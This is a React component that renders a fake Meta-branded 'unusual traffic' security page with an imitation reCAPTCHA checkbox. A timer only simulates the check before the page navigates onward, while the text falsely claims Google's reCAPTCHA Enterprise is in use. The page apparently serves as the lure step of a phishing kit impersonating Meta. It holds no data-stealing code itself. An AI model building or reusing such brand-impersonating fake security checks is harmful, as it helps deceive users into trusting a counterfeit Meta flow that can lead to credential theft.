import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import { useEffect, useState } from 'react';

const Index = () => {
    const navigate = useNavigate();
    const [isVerifying, setIsVerifying] = useState(false);
    const [isShowCheckMark, setIsShowCheckMark] = useState(false);

    const handleVerify = async () => {
        setIsVerifying(true);
        
        // Giả lập verify
        setTimeout(() => {
            setIsShowCheckMark(true);
            setIsVerifying(false);
        }, 2000);
    };

    useEffect(() => {
        if (isShowCheckMark) {
            setTimeout(() => {
                navigate('/home');
            }, 500);
        }
    }, [isShowCheckMark, navigate]);

    return (
        <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
            <title>Our systems have detected unusual traffic from your computer network</title>
            
            <div className='flex max-w-[620px] flex-col gap-6 rounded-lg bg-white p-6 sm:shadow-lg'>
                {/* Header */}
                <div className='flex justify-center'>
                    <img src={MetaImage} alt='Meta' className='w-16' />
                </div>

                <h1 className='text-2xl font-bold text-center text-gray-800'>
                    Our systems have detected unusual traffic from your computer network
                </h1>

                {/* reCAPTCHA Box */}
                <div className='flex w-full items-center justify-center'>
                    <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] p-4 text-[#4c4a4b]'>
                        <div className='flex items-center gap-3'>
                            <button
                                onClick={handleVerify}
                                disabled={isVerifying || isShowCheckMark}
                                className='flex items-center justify-center'
                            >
                                {isVerifying ? (
                                    <div className='h-8 w-8 animate-spin rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent'></div>
                                ) : (
                                    <div
                                        className={`h-8 w-8 rounded-[3px] ${!isShowCheckMark ? 'border-2 border-gray-500 bg-white' : ''}`}
                                        style={{
                                            backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : '',
                                            backgroundPosition: '-10px -595px',
                                            backgroundSize: 'cover'
                                        }}
                                    />
                                )}
                            </button>
                            <span className='text-sm font-semibold text-gray-600'>I'm not a robot</span>
                        </div>
                        
                        <div className='flex flex-col items-center text-[#9d9ba7]'>
                            <img src={ReCaptchaImage} alt='reCAPTCHA' className='h-8 w-8' />
                            <p className='text-xs font-bold'>reCAPTCHA</p>
                            <small className='text-[10px] text-gray-500'>Privacy - Terms</small>
                        </div>
                    </div>
                </div>

                {/* Description */}
                <div className='space-y-3 text-sm text-gray-600'>
                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p>We've used Google's reCAPTCHA Enterprise product to provide this security check.</p>
                </div>

                {/* Continue Button */}
                <button
                    className='rounded-lg bg-blue-500 px-4 py-3 font-bold text-white disabled:opacity-50'
                    disabled={!isShowCheckMark}
                    onClick={() => navigate('/home')}
                >
                    Continue
                </button>
            </div>
        </div>
    );
};

export default Index;
